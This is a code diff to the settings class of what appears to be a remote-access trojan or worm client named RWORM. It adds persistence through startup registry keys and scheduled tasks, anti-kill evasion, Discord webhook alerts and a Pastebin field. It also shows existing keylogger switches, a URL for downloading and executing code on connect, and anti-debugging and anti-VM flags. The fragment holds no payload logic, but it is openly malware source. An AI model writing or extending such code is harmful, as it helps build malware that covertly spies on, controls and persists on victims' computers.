@@ -11,20 +11,29 @@ namespace RWORM.Client.Core
         public static int    ReconnectDelay  = 5000;
         public static int    ConnectTimeout  = 8000;
         public static int    HeartbeatInterval = 30000;
+        public static string PastebinRaw     = "";
 
         // ── Keylogger ─────────────────────────────────────────────────────────
-        // Builder patches these two lines by exact string replacement.
         public static bool   KeyloggerEnabled = false;
         public static bool   KeyloggerOnline  = false;   // false = offline mode
 
         // ── Task on connect ───────────────────────────────────────────────────
-        // Builder patches these lines.
         public static bool   TaskEnabled   = false;
         public static string TaskLoaderUrl = "";          // URL to download+exec on connect
 
-        // ── Evasion ───────────────────────────────────────────────────────────
+        // ── Anti-Kill & Evasion ───────────────────────────────────────────────
+        public static bool AntiKill  = false;
         public static bool AntiDebug = false;
         public static bool AntiVM    = false;
+
+        // ── Discord Webhook Alerts ────────────────────────────────────────────
+        public static bool   DiscordAlert   = false;
+        public static string DiscordWebhook = "";
+
+        // ── Persistence ───────────────────────────────────────────────────────
+        public static bool   StartupRegistry = false;
+        public static bool   SchTasks        = false;
+        public static string StartupPath     = @"%APPDATA%\RWORM";
 
         // ─────────────────────────────────────────────────────────────────────
 
